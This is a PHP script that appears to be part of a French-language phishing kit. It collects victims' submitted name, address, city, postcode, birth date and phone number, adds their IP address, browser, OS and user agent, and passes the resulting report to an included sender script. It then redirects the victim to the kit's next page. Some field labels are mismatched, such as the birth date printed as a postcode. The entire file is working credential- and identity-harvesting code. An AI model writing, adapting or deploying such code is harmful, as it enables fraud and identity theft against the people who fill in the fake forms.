<?php
error_reporting(0);
session_start();

include("detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;	

$InfoDATE   = date("d-m-Y h:i:sa");

$prenom = $_SESSION['prenom'] = $_POST['prenom'];
$nom = $_SESSION['nom'] = $_POST['nom'];
$adresse = $_SESSION['adresse'] = $_POST['adresse'];
$ville = $_SESSION['ville'] = $_POST['ville'];
$codepos = $_SESSION['codepos'] = $_POST['codepos'];
$datenaiss = $_SESSION['datenaiss'] = $_POST['datenaiss'];
$numtel = $_SESSION['numtel'] = $_POST['numtel'];
$prix = $_SESSION['prix'] = $_POST['prix'];





$yagmai .= '
[💬 Prenom ] = '.$_SESSION['prenom'].'
[💬 Nom ] = '.$_SESSION['nom'].'
[💬 Adresse] = '.$_SESSION['adresse'].'
[💬 Ville ] = '.$_SESSION['ville'].'
[💬 Code de postale ] = '.$_SESSION['codepos'].'
[💬 Code postale ] = '.$_SESSION['datenaiss'].'
[💬 Securi code  Mail ] = '.$_SESSION['prenom'].'
[💬 Securi code  Mail ] = '.$_SESSION['prenom'].'
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
';
 
include("SendApi.php"); 

header('Location: ../info-b.php');

?>